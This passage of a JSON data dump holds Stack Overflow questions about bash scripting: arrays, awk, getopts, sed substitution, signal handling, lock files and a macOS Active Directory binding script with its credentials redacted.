wanted to create a file in a certain directory from another directory in unix.</p>\n\n<p>Example: </p>\n\n<pre><code>File to be created: pop.txt\nDirectory to create that in: /home/p1\nDirectory you are currently in and are to make it from: /home/pokemon/master/\n</code></pre>\n\n<p>Thanks</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":41,"score":0,"question_id":12744245,"title":"Bash - How to find the highest number in array?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/7442417/how-to-sort-an-array-in-bash\">How to sort an array in BASH</a>  </p>\n</blockquote>\n\n\n\n<p>I have numbers in the array 10 30 44 44 69 12 11...</p>\n\n<p>How to display the highest from array?</p>\n\n<p>echo $NUM //result 69</p>\n\n<p>Thank you</p>\n"},{"tags":["bash","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12739515,"title":"Setting multiple field to awk variables at once","body":"<p>I am trying to set an awk variable field to several field at once. </p>\n\n<p>Right now I can only set the variables one by one.</p>\n\n<pre><code>for line in `cat file.txt`;do\n    var1=`echo $line | awk -F, '{print $1}'`\n    var2=`echo $line | awk -F, '{print $2}'`\n    var3=`echo $line | awk -F, '{print $3}'`\n\n    #Some complex code....\ndone\n</code></pre>\n\n<p>I think this is costly cause it parses the linux variable several times. Is there a special syntax to set the variable at once? I know that awk has a BEGIN and END block but the reason I am trying to avoid the BEGIN and END block is to avoid nested awk. </p>\n\n<p>I plan to place another loop and awk code in the #Some complex code.... part.</p>\n\n<pre><code>for line in `cat file.txt`;do\n    var1=`echo $line | awk -F, '{print $1}'`\n    var2=`echo $line | awk -F, '{print $2}'`\n    var3=`echo $line | awk -F, '{print $3}'`\n\n    for line2 in `cat file_old.txt`;do\n        vara=`echo $line2 | awk -F, '{print $1}'`\n        varb=`echo $line2 | awk -F, '{print $2}'`\n\n        # Do comparison of $var1,var2 and $vara,$varb , then do something with either\n    done\ndone\n</code></pre>\n"},{"tags":["regex","bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":12740980,"title":"Retrieve matching element from string","body":"<p>Using bash I have a string that holds my deployed applications:</p>\n\n<pre><code>APPS=\"myapp-a-1.0.war myapp-b-1.1.war myapp-c-1.2-SNAPSHOT.war\"\n</code></pre>\n\n<p>I can determine whether a specific app is deployed:</p>\n\n<pre><code>if [[ \"$APPS\" == *myapp-a* ]]\nthen\n    echo \"myapp-a is deployed, but we don't know the version.\"\nfi\n</code></pre>\n\n<p>How can I retrieve the complete matching word (application with version) given that I only have the  words prefix (application name, e.g. 'myapp-a')?</p>\n"},{"tags":["bash","command-line"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12741529,"title":"break line in read -p in bash","body":"<p>how could I break the line using \\n in read -p ?\nfor example </p>\n\n<pre><code>read -p \"Please Enter the percent [30 between 100]\\n The value is  Default = 80   :\" scale_percent\n</code></pre>\n\n<p>I want \\n to break the line but it doesnt</p>\n\n<p>in echo I use -e and it breaks the line\nbut I did try </p>\n\n<pre><code>read -ep \n</code></pre>\n\n<p>to break the line but it didnt break the line, how can I do that?\nand could you also please give me a good manual for read -p in internet I couldnt find a nice one without confusing description.</p>\n"},{"tags":["bash","shell","nginx"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12742124,"title":"How to replace environment variables with their values in a text file?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/5274343/replacing-environment-variables-in-a-properties-file\">Replacing environment variables in a properties file</a>  </p>\n</blockquote>\n\n\n\n<p>Nginx config files don't support environment variables expansion. I would like to preprocess such config file to be able to parametrize it. So for example IP and PORT in a config snippet like this:</p>\n\n<pre><code> server {\n        listen       $IP:$PORT;\n        server_name  localhost;\n  ...\n</code></pre>\n\n<p>would be replaced with values of IP and PORT environment variables. Is there a standard and robust way to perform such preprocessing? I would like preprocessing to replace any variable, without explicitly listing which vars need to be replaced.</p>\n"},{"tags":["bash","shell"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":64,"score":0,"question_id":12394907,"title":"Bash getopts does not recognize parameter","body":"<pre><code>while getopts \":hufc:p:i\" opt; do\n\n  case $opt in\n    h)\n        usage\n        exit 1\n        ;;\n    u)\n      DOUPDATE=false\n      ;;\n    f)\n      DOCONFIRMATION=false\n      ;;\n    c)\n       CUSTOMERTYPE=$OPTARG\n       ;;\n    p)\n       CUSTOMERPROFILE=$OPTARG\n       ;;\n    i)\n        echo \"LOL $INSTALL\"\n        INSTALL=true\n        ;;\n    \\?)\n      echo \"Invalid option: -$OPTARG\" &gt;&amp;2\n      exit 1\n      ;;\n     :)\n      echo \"Option -$OPTARG requires an argument.\" &gt;&amp;2\n      exit 1\n      ;;\n  esac\ndone\n</code></pre>\n\n<p>Above is my bash code. When I try to use \"i\" as a parameter in the command line, case i is not entered.</p>\n\n<p>What should I do?</p>\n"},{"tags":["bash","signals","job-control","sigterm"],"answer_count":5,"favorite_count":3,"up_vote_count":17,"down_vote_count":0,"view_count":2434,"score":17,"question_id":690415,"title":"In what order should I send signals to gracefully shutdown processes?","body":"<p>In a <a href=\"http://stackoverflow.com/questions/526782/how-do-i-limit-the-running-time-of-a-bash-script#comment340090_526815\"><em>comment</em></a> on <a href=\"http://stackoverflow.com/questions/526782#526815\">this answer</a> of another <a href=\"http://stackoverflow.com/questions/526782\">question</a>, the commenter says:</p>\n\n<blockquote>\n  <p>don’t use kill&nbsp;-9 unless absolutely\n  necessary! SIGKILL can’t be trapped so\n  the killed program can’t run any\n  shutdown routines to e.g.&nbsp;erase\n  temporary files. First try HUP&nbsp;(1),\n  then INT&nbsp;(2), then QUIT&nbsp;(3)</p>\n</blockquote>\n\n<p>I agree in principle about <code>SIGKILL</code>, but the rest is news to me. Given that the default signal sent by <code>kill</code> is <code>SIGTERM</code>, I would expect it is the most-commonly expected signal for graceful shutdown of an arbitrary process. Also, I have seen <code>SIGHUP</code> used for non-terminating reasons, such as telling a daemon \"re-read your config file.\" And it seems to me that <code>SIGINT</code> (the same interrupt you'd typically get with Ctrl-C, right?) isn't as widely supported as it ought to be, or terminates rather ungracefully.</p>\n\n<p>Given that <code>SIGKILL</code> is a last resort &mdash; <strong>Which signals, and in what order</strong>, should you send to an arbitrary process, in order to shut it down as gracefully as possible?</p>\n\n<p>Please substantiate your answers with supporting facts (beyond personal preference or opinion) or references, if you can.</p>\n\n<p>Note: I am particularly interested in best practices that include consideration of bash/Cygwin.</p>\n\n<p><strong>Edit:</strong> So far, nobody seems to mention INT or QUIT, and there's limited mention of HUP. Is there any reason to include these in an orderly process-killing?</p>\n"},{"tags":["arrays","bash","shell","script"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":122,"score":2,"question_id":12317483,"title":"Array of arrays in bash","body":"<p>I'm attempting to read an input file line by line which contains fields delimited by periods.\nI want to put them into an array of arrays so I can loop through them later on.  The input appears to be ok, but 'pushing' that onto the array (inData) doesn't appear to be working.</p>\n\n<p>The code goes :</p>\n\n<pre><code>Input file: \nGSDB.GOSALESDW_DIST_INVENTORY_FACT.MONTH_KEY\nGSDB.GOSALESDW_DIST_INVENTORY_FACT.ORGANIZATION_KEY\n\n\ninfile=${1}\n\nOIFS=$IFS\nIFS=\":\"\n\ncat ${infile} | while read line\ndo\n      line=${line//\\./:}\n      inarray=(${line})\n#      echo ${inarray[@]}\n#      echo ${#inarray[@]}      \n#      echo ${inarray[0]}\n#      echo ${inarray[1]}\n#      echo ${inarray[2]}\n\n      inData=(\"${inData[@]}\" \"${inarray[@]}\")\ndone \nIFS=$OIFS\n\necho ${#inData[@]}   \n\nfor ((i = 0; i &lt; ${#inData[@]}; i++))\ndo\n echo $i\n    for ((j = 0; j &lt; ${#inData[$i][@]}; j++))\n    do\n       echo ${inData[$i][$j]}\n    done\ndone\n</code></pre>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":65,"score":1,"question_id":12720273,"title":"Bash: How to create variables from array of strings?","body":"<p>I have the file \"Testfile\", whit a register in every line, each register having some fields:</p>\n\n<pre><code>foo1=32=test01=30/03/2012 10:03 p.m\nfoo2=54=test02=30/03/2012 10:05 p.m\nfoo3=912=test03=30/03/2012 10:08 p.m\n</code></pre>\n\n<p>(\"=\" is the field delimiter)</p>\n\n<p>I read the first field for every register and store them in an array, and the same for the second field of every register:</p>\n\n<pre><code>NAMES=(`cut -f1 -d'=' Testfile`)\nVALUES=(`cut -f2 -d'=' Testfile`)\n</code></pre>\n\n<p>That gives me two arrays like these: (foo1 foo2 foo3) and (32 54 912)</p>\n\n<p>Is it possible to dynamically create variables named foo1 foo2 and foo3, and assign them their respective values?</p>\n\n<p>I could do:</p>\n\n<pre><code>foo1 = ${VALUES[0]}\nfoo2 = ${VALUES[1]}\nfoo3 = ${VALUES[2]}\n</code></pre>\n\n<p>But I want to get the names of the variables dynamically, regarding the names that I've got from the file.</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12739814,"title":"Bash: echo from command while it's executing","body":"<p>I want to see the entire output (not just the return value) of a script while it's executing via bash, like this:</p>\n\n<pre><code>#!/bin/sh    \ncmd=\"$(script.py $arg)\"\n</code></pre>\n\n<p>script.py prints multiple lines while executing, but I'm unable to see them\nin bash. Is there a way to maybe pipe the output to stdout?</p>\n"},{"tags":["bash","shell","ubuntu","command-line"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":65,"score":1,"question_id":12738460,"title":"How to get output of a bash command in a variable","body":"<p>I have been following through some of the similar questions (such as <a href=\"http://stackoverflow.com/questions/4651437/how-to-set-a-bash-variable-equal-to-the-output-from-a-command\">How to set a BASH variable equal to the output from a command?</a>), however the accepted answers seem to be non-working for me. I wasn't sure whether I ought to derail someone else's question or post my own duplicate, so apologies if I chose wrong here.</p>\n\n<p>I wish to get the output and exit status of a number of commands in a script I am putting together. Here is an example of what I have been using:</p>\n\n<pre><code>cmd_output=$(rm $file)\nexit_status=$?\nif [ \"${exit_status}\" -eq 0 ]\nthen\nlog \"Successfully removed the original\" ${TAB_LEVEL}\nelse\nfail \"Failed to remove the original, the output was: \\n ${cmd_output}\"\nfi\n</code></pre>\n\n<p>The log and fail functions are:</p>\n\n<pre><code># Usage: fail \"Failure message\"\nfunction fail {\necho \"FATAL ERROR: $1\" &gt;&gt; \"${LOG_DIR}/${LOG_FILE}\"\nexit 1\n}\n\n# Usage: log \"Log message\" 3    Where the tab-level is 3.\nfunction log {\nif ((\"${2}\" &gt; 0))\nthen\neval \"printf '    %.0s' {1..$2}\" &gt;&gt; \"${LOG_DIR}/${LOG_FILE}\"\nfi\necho \"$1\" &gt;&gt; \"${LOG_DIR}/${LOG_FILE}\"\nreturn 0\n}\n</code></pre>\n\n<p>In the example above I use the $(cmd) format, but I have also tried using backticks.</p>\n\n<p>In my log file, all I see when there is a failure is:</p>\n\n<blockquote>\n  <p>FATAL ERROR: Failed to remove the original, the output was: \\n</p>\n</blockquote>\n\n<p>Also, the output of the failed commands ends up on screen as per usual. Is there a common reason that my cmd_output variables would be remaining empty?</p>\n"},{"tags":["bash","unix"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12731391,"title":"Print/Obtain first character of a line in a text file in UNIX","body":"<p>Was wondering how you print/obtain the first character in a text file in unix.</p>\n\n<p>i.e say \"9 textfile.txt\" would return 9</p>\n\n<p>thx</p>\n"},{"tags":["linux","bash","stat"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":277,"score":0,"question_id":12729784,"title":"mv: cannot stat error : No such file or directory error","body":"<p>I need to move the files of a directory to another directory.I get stat error when I used the following program. </p>\n\n<pre><code>for i in dir1/*.txt_dir; do\nmv $i/*.txt  dir2/`basename $i`.txt\ndone\n</code></pre>\n\n<p>error message</p>\n\n<pre><code>mv: cannot stat `dir1/aa7.txt_dir/*.txt': No such file or directory\n</code></pre>\n"},{"tags":["bash","shell","echo"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12718801,"title":"Echo some command lines in a shell script (echo on for single command)","body":"<p>In shell scripts I would like to echo some of the major (long running) commands for status and debug reason. I know I can enable an echo for all commands with <code>set -x</code> or <code>set -v</code>. But I don't want to see all the commands (specially not the echo commands). Is there a way to turn on the echo for just one command?</p>\n\n<p>I could do like this, but that's ugly and echoes the line <code>set +x</code> as well:</p>\n\n<pre><code>#!/bin/sh\n\ndir=/tmp\necho List $dir\n\nset -x\nls $dir\nset +x\n\necho Done!\n</code></pre>\n\n<p>Is there a better way to do this?</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12735788,"title":"Bash find and replace with sed","body":"<p>I'm trying to replace a number that is in a couple different strings in a text file.  Basically it would take the form of </p>\n\n<pre><code>tableNameNUMBER\ncarNUMBER\n</code></pre>\n\n<p>I'm pretty new to bash and scripting and I wasn't sure how to replace <code>NUMBER</code> with what I pass in.  So I've tried this:</p>\n\n<pre><code>#1 /usr/bin/env bash\nsed \"s/NUMBER/$1/\" myScript.txt &gt; test.txt\n</code></pre>\n\n<p>then at the cmd line:</p>\n\n<pre><code>sh test.sh 123456\n</code></pre>\n\n<p>This only works if <code>NUMBER</code> is on its own, without <code>tableName</code> or <code>car</code> preceding it.  How can I replace <code>NUMBER</code> in those cases.  Is it better to have <code>${NUMBER}</code>?  Sorry if these are totally noob questions.  </p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":12726741,"title":"atoi() like function in bash?","body":"<p>Imagine that I use a state file to store a number, I read the number like this:</p>\n\n<p><code>COUNT=$(&lt; /tmp/state_file)</code></p>\n\n<p>But since the file could be disrupted, $COUNT may not contain a \"number\", but any characters.</p>\n\n<p>Other than using regex, i.e <code>if [[ $COUNT ~ ^[0-9]+$ ]]; then blabla; fi</code>, is there a \"atoi\" function that convert it to a number(0 if invalid)?</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>Finally I decided to use something like this:</p>\n\n<p><code>let a=$(($a+0))</code> </p>\n\n<p>Or </p>\n\n<p><code>declare -i a; a=\"abcd123\"; echo $a # got 0</code></p>\n\n<p>Thanks to J20 for the hint.</p>\n"},{"tags":["bash","unix"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":12736340,"title":"Function that extracts certain specified line of a text file in Unix","body":"<p>Was wondering if someone can help me with this. So I have a text file with 10 lines, a while loop and a counter that starts at 10. For each iteration of the loop, I will decrement it. However for every iteration, I want to extract a line say the 10th line on the first rotation and the 9th line on the second to compare them. Is there a function that say you pass a value to and it extracts a certain line? or some combination of it. Would appreciate the help \nThanks</p>\n"},{"tags":["linux","bash","parameters","tags","grep"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12735315,"title":"How to create a bash function with variable parameters/arguments to grep several keywords/tags","body":"<p>I'm using the <code>:!grep \"tag1\" filename | grep \"tag2\" filename | grep -n \"tag3 or more\" filename</code> command in vim to search for my code snippets based on their tags (a simple comment at the top of a snippet) in one big file, similar to firefox's tag functionality. I use snippets to remember tricky things.</p>\n\n<p>This is painful to write out each time. I'd like to make an alias, or function to do something like this:</p>\n\n<pre><code>:!greptag tag1 tag2 ... tag39\n</code></pre>\n\n<p>And it should search the current doc and return the lines with all the tags on them. </p>\n\n<p>Vim is set to interactive shell mode so that it can parse my bashrc for aliases/functions.</p>\n\n<pre><code>set shellcmdflag=-ic \"lets vim use bashrc\n</code></pre>\n\n<p>How can I construct a function that allows for variable arguments like this in bash?</p>\n"}]}
{"total":16352,"page":14,"pagesize":100,"questions":[{"tags":["bash","unix","cmp"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":48,"score":-1,"question_id":12736013,"title":"Comparison function that compares two text files in Unix","body":"<p>I was wondering if anyone could tell me if there is a function available in unix, bash that compares all of the lines of the files. If they are different it should output true/false, or -1,0,1. I know these cmp functions exist in other languages. I have been looking around the man pages but have been unsuccessful. If it is not available, could someone help me come up with an alternative solution?</p>\n\n<p>Thanks</p>\n"},{"tags":["bash","sh","trap"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":117,"score":3,"question_id":9620126,"title":"Restore traps without a temp file","body":"<p>Without arguments <code>trap</code> prints the currently set commands for all traps.  However, a subshell does not inherit traps, so the canonical example for saving and restoring traps fails in bash:</p>\n\n<pre>\nsave_traps=$(trap)\n...\neval \"$save_traps\"\n</pre>\n\n<p>The trap on the RHS of the assignment runs in a subshell, so save_traps is always the empty string.  Other than writing the output of <code>trap</code> to a temporary file, how can a script find the current command set for a trap?</p>\n"},{"tags":["osx","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":114,"score":1,"question_id":12734238,"title":"Bash \"if ping then else\" My else is not working","body":"<p>I have a bash script that should work based on whether I can ping my network address or not.  There will be instances when this script is ran outside of my network in which case I don't want it to run.  So I put together this</p>\n\n<pre><code>if ping -c 1 xxx.xxx.x.x &gt; /dev/null; then\n</code></pre>\n\n<p>When it's in the network, the \"then\" statement works just fine.  However, whenever I turn off my wireless card and disconnect my ethernet cable to test the \"else\" my else statement never get's executed.  Is there another way I should be writing this?</p>\n\n<p>Here's the full script;</p>\n\n<pre><code>#!/bin/bash\n\ncomputerid=`/usr/sbin/scutil --get LocalHostName`\n\n# Standard parameters\ndomain=\"xxx.xxxxxxx.xxx\"                            # fully qualified DNS name of Active Directory Domain\nudn=\"xxxxxx\"                                            # username of a privileged network user\npassword=\"xxxxxx\"                                           # password of a privileged network user\nou=\"OU=MacOS,DC=xxx,DC=xxxxxxx,DC=xxx\"              # Distinguished name of container for the computer\n\n# Advanced options\nalldomains=\"enable\"                 # 'enable' or 'disable' automatic multi-domain authentication\nlocalhome=\"enable\"                  # 'enable' or 'disable' force home directory to local drive\nprotocol=\"smb\"                              # 'afp' or 'smb' change how home is mounted from server\nmobile=\"enable\"                         # 'enable' or 'disable' mobile account support for offline logon\nmobileconfirm=\"disable\"             # 'enable' or 'disable' warn the user that a mobile acct will be created\nuseuncpath=\"enable\"                 # 'enable' or 'disable' use AD SMBHome attribute to determine the home dir\nuser_shell=\"/bin/bash\"              # e.g., /bin/bash or \"none\"\npreferred=\"-preferred xxx.xxxxxx.xxx\"       # Use the specified server for all Directory lookups and authentication\n# (e.g. \"-nopreferred\" or \"-preferred ad.server.edu\")\nadmingroups=\"xxx\\domain admins,xxx\\enterprise admins,xxx\\teacher98,xxx\\ADManagement - Computers,xxx\\admin employees\"        # These comma-separated AD groups may administer the machine (e.g. \"\" or \"APPLE\\mac admins\")\n\n### End of configuration\n\n# Delay the login window by unloading the com.apple.loginwindow\n# LaunchDaemon in /System/Library/LaunchDaemons/\n\nlaunchctl unload -w /System/Library/LaunchDaemons/com.apple.loginwindow.plist\n\n\n## Wait until all network services are up.\nsleep 10\n\n# Check to see if we're in the district\nif ping -c 1 xxx.xxx.x.x &gt; /dev/null; then\n\n\n    #make sure time is set correctly\n    ntpdate -u time.xxxxxxx.xxx\n\n\n    # Activate the AD plugin\n    defaults write /Library/Preferences/DirectoryService/DirectoryService \"Active Directory\" \"Active\"\n    plutil -convert xml1 /Library/Preferences/DirectoryService/DirectoryService.plist\n    sleep 5\n\n    # Remove computer from OU\n    dsconfigad -f -r -u xxxxxx -p xxxxxx\n    sleep 5\n\n    # Bind to AD\n    dsconfigad -f -a $computerid -domain $domain -u $udn -p \"$password\" -ou \"$ou\"\n\n    # Configure advanced AD plugin options\n    if [ \"$admingroups\" = \"\" ]; then\n        dsconfigad -nogroups\n    else\n        dsconfigad -groups \"$admingroups\"\n    fi\n\n    dsconfigad -alldomains $alldomains -localhome $localhome -protocol $protocol \\\n        -mobile $mobile -mobileconfirm $mobileconfirm -useuncpath $useuncpath \\\n        -shell $user_shell $preferred\n\n    # Restart DirectoryService (necessary to reload AD plugin activation settings)\n    killall DirectoryService\n\n    # Add the AD node to the search path\n    if [ \"$alldomains\" = \"enable\" ]; then\n        csp=\"/Active Directory/All Domains\"\n    else\n        csp=\"/Active Directory/$domain\"\n    fi\n\n    # This works in a pinch if the above code does not\n    defaults write /Library/Preferences/DirectoryService/SearchNodeConfig \"Search Node Custom Path Array\" -array \"/Active Directory/All Domains\"\n    defaults write /Library/Preferences/DirectoryService/SearchNodeConfig \"Search Policy\" -int 4\n    defaults write /Library/Preferences/DirectoryService/ContactsNodeConfig \"Search Node Custom Path Array\" -array \"/Active Directory/All Domains\"\n    defaults write /Library/Preferences/DirectoryService/ContactsNodeConfig \"Search Policy\" -int 4\n\n    plutil -convert xml1 /Library/Preferences/DirectoryService/SearchNodeConfig.plist\n\n    ## Remove the script and launchd job. Be sure to delete the script. \n    rm /Library/LaunchDaemons/com.xxxx.adbind.plist\n    rm /usr/local/bin/adbind.bash\n    launchctl unload -w /Library/LaunchDaemons/com.xxxx.adbind.plist\n\n    # Remove the loginwindow delay by loading the com.apple.loginwindow   \n    # LaunchDaemon in /System/Library/LaunchDaemons/\n\n    launchctl load -wF /System/Library/LaunchDaemons/com.apple.loginwindow.plist\n\n    exit 0\n\nelse\n\n    echo \"District not Available Quitting\"\n\n    # Remove the loginwindow delay by loading the com.apple.loginwindow   \n    # LaunchDaemon in /System/Library/LaunchDaemons/\n\n    launchctl load -wF /System/Library/LaunchDaemons/com.apple.loginwindow.plist\n\nfi\n\nexit 1\n</code></pre>\n\n<p>Thanks for any suggestions!</p>\n"},{"tags":["bash","ubuntu","automation","ncurses","apt-get"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12582097,"title":"Automate installation using bash script - how to answer dialogs written with ncurses","body":"<p>How to automatically answer dialogs (written with ncurses) during installation in Ubuntu? For example during postfix installation.</p>\n"},{"tags":["arrays","bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":63,"score":3,"question_id":12711786,"title":"Bash: convert command line arguments into array","body":"<p>How do I convert command-line arguments into a bash script array?</p>\n\n<p>I want to take this:</p>\n\n<pre><code>./something.sh arg1 arg2 arg3\n</code></pre>\n\n<p>and convert it to </p>\n\n<pre><code>myArray=( arg1 arg2 arg3 )\n</code></pre>\n\n<p>so that I can use myArray for further use in the script.</p>\n\n<p>This previous SO post comes close, but doesn't go into how to create an array: <a href=\"http://stackoverflow.com/questions/192249/how-do-i-parse-command-line-arguments-in-bash\">How do I parse command line arguments in bash?</a></p>\n\n<p>I need to convert the arguments into a regular bash script array; I realize I could use other languages (Python, for instance) but need to do this in bash. I guess I'm looking for an \"append\" function or something similar?</p>\n\n<p>UPDATE: I also wanted to ask how to check for zero arguments and assign a default array value, and thanks to the answer below, was able to get this working:</p>\n\n<pre><code>if [ \"$#\" -eq 0 ]; then\n  myArray=( arg1 arg2 arg3 )\nelse\n  myArray=( \"$@\" )\nfi\n</code></pre>\n"},{"tags":["php","bash","shell","parameters","parameter-passing"],"answer_count":3,"favorite_count":1,"up_vote_count":9,"down_vote_count":0,"view_count":3962,"score":9,"question_id":6779576,"title":"How to pass parameters from bash to php script?","body":"<p>I have done a a bash script which run php script. It works fine without parameters  but when I add parameters (id and url), there are some errors:</p>\n\n<pre><code>PHP Deprecated:  Comments starting with '#' are deprecated in /etc/php5/cli/conf                                                                                        .d/mcrypt.ini on line 1 in Unknown on line 0\nCould not open input file: /var/www/dev/dbinsert/script/automatisation.php?                                                                                        id=1\n</code></pre>\n\n<p>I run php script from the bash like this:</p>\n\n<pre><code>php /var/www/dev/dbinsert/script/automatisation.php?id=19&amp;url=http://bkjbezjnkelnkz.com\n</code></pre>\n"},{"tags":["bash","shell"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":3,"view_count":5397,"score":-1,"question_id":1333813,"title":"Recursively read folders and executes command on each of them","body":"<p>I am trying to recurse folders and run commands on them, using bash script. Any suggestions?</p>\n"},{"tags":["bash","semaphore"],"answer_count":5,"favorite_count":9,"up_vote_count":16,"down_vote_count":0,"view_count":5916,"score":16,"question_id":169964,"title":"How to prevent a script from running simultaneously?","body":"<p>I want to prevent my script running more than once at a time. </p>\n\n<p>My current approach is</p>\n\n<ul>\n<li>create a semaphore file containing the pid of the running process</li>\n<li>read the file, if my process-id is not in it exit (you never know...)</li>\n<li>at the end of the processing, delete the file</li>\n</ul>\n\n<p>In order to prevent the process from hanging, I set up a cron job to periodically check the file if its older then the maximum allowed running time and kills the process if it’s still running.</p>\n\n<p>Is there a risk that I'm killing a wrong process?</p>\n\n<p>Is there a better way to perform this as a whole?</p>\n\n<p>-Thanks!</p>\n"},{"tags":["linux","bash","shell","script"],"answer_count":3,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":101,"score":3,"question_id":12729326,"title":"Redirecting stdout only if command failed?","body":"<p>I'm writing a bash script that is supposed to be \"transparent\" to the user. It reads commands from the user and intercepts them, allowing only some of them to be executed by bash, depending on some criteria. It (basically) works like this:</p>\n\n<pre><code>while true; do\n   read COMMAND\n   can_be_done $COMMAND\n   if [ $? == 0 ]; then\n      eval $COMMAND\n      if [ $? != 0 ]; then\n         echo \"Error: command not found\"\n      fi\n   fi\ndone\n</code></pre>\n\n<p>The problem is, when the command fails, you also get stuff printed to the console. BUT, if I keep the result in a variable and only print it when it doesn't fail, like so:</p>\n\n<pre><code>RESULT=$(eval $COMMAND)\n</code></pre>\n\n<p>Then there's another problem: The special formatting gets lost (for example, \"ls --color\" doesn't show colors anymore)</p>\n\n<p>My question is: Is there a way to have the command print to STDOUT if successful, but to /dev/null if it fails?</p>\n"},{"tags":["bash","unix"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12731797,"title":"Output number of lines in a text file to screen in Unix","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12022319/bash-echo-number-of-lines-of-file-given-in-a-bash-variable\">bash echo number of lines of file given in a bash variable</a>  </p>\n</blockquote>\n\n\n\n<p>Was wondering how you output the number of lines in a text file to screen and then store it in a variable.\nI have a file called stats.txt and when I run <code>wc -l stats.txt</code> it outputs <code>8 stats.txt</code></p>\n\n<p>I tried doing <code>x = wc -l stats.txt</code> thinking it would store the number only and the rest is just for visual but it does not work :(</p>\n\n<p>Thanks for the help</p>\n"},{"tags":["linux","bash"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":142,"score":1,"question_id":5861607,"title":"Bash variable mystery","body":"<p>So at work we use an accounting system and at the end of the month we have to modify a script for the previous month and specify a new name for the log that's printing out. Since I'm fairly lazy and would rather spend my time learning something new than repeating the same task over again I decided I wanted to write the script to do it all for me and set it as a cron job. Since I just started this job and I'm new to Bash programming in general I decided to research a little and found everything I needed to do the job and came up with this.</p>\n\n<pre><code>#!/bin/bash\nmonth= $(echo $(date --date=\"last month\" +%b))\nyear=$(echo $(date +%Y))\necho $(date --date=\"last month\" +%Y-%m-%d)\necho $(date --date=\"yesterday\" +%Y-%m-%d)\necho $(date --date=\"last month\" +%b)\necho garuda-summary-$month$year.log;\n</code></pre>\n\n<p>and it prints out this</p>\n\n<pre><code>test.sh: line 2: Apr: command not found\n2011-04-02\n2011-05-01\nApr\ncomputer-summary-2011.log\n</code></pre>\n\n<p>So I played with it some more and got this one to work. But it's ugly and I want to know why it didn't work before. Thanks in adv</p>\n\n<pre><code>#!/bin/bash\nmonth= $(echo $(date --date=\"last month\" +%b))\nyear=$(echo $(date +%Y))\necho $(date --date=\"last month\" +%Y-%m-%d)\necho $(date --date=\"yesterday\" +%Y-%m-%d)\necho $(date --date=\"last month\" +%b)\necho garuda-summary-$(date --date=\"last month\" +%b)$year.log;\n</code></pre>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":142,"score":0,"question_id":3809480,"title":"Comparing Variable to Ints with if/fi in BASH script","body":"<p>I am trying to compare the $duration variable to an int, to see how long it is. I need to deturmine how many 0's to append to the file name to maintain clean names e.g.</p>\n\n<p>cap_000001.png</p>\n\n<p>cap_002938.png</p>\n\n<p>My current statement is: </p>\n\n<pre><code>if [ $duration &lt; 1000 ]; then\n    sudo ./v2u cap_000$duration.png\n    echo 1000 seconds\nfi\nif [ $duration &lt; 100 ]; then\n    sudo ./v2u cap_0000$duration.png\n    echo 100 seconds\nfi\nif [ $duration &lt; 10 ]; then\n    sudo ./v2u cap_00000$duration.png\n    echo 10 seconds\nfi\n</code></pre>\n\n<p>Thanks for Helping!</p>\n\n<p>If someone has an easier solution for naming the files with a consistent number of digits that would be great too!</p>\n"},{"tags":["bash","pipe","command-substitution","variable-subsitution"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":12718538,"title":"Bash Command Substitution with Variables","body":"<p>I have a bash script that builds a command based on a list of files so the command is built on the fly.  Building it on the fly means it gets stored in a variable.  I then want to run that command and store the output in a separate variable.  When I use command substitution to try and run the command, it craps out.  How can I get command substitution to work with a command in a variable when that variable utilizes pipes?</p>\n\n<p>Here is my script:</p>\n\n<pre><code># 